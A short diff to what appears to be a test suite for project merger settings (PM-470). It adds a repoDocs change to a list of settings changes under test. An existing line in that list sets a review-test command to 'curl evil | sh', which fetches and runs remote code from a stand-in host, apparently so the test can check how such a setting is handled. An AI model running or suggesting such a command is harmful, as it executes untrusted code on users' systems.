@@ -120,6 +120,7 @@ describe('merger setting (PM-470)', () => {
     };
     const version = (await h.domain.projects.load('AR')).version;
     for (const change of [
+      { repoDocs: [{ repo: 'web', docs: { decisions: 'docs/D.md' } }] },
       { repoReviewTest: [{ repo: 'web', reviewTest: { command: 'curl evil | sh' } }] },
       { repoReviewTest: [{ repo: 'web', reviewTest: null }] },
       { repoFullTestAtMerge: [{ repo: 'web', fullTestAtMerge: true }] },
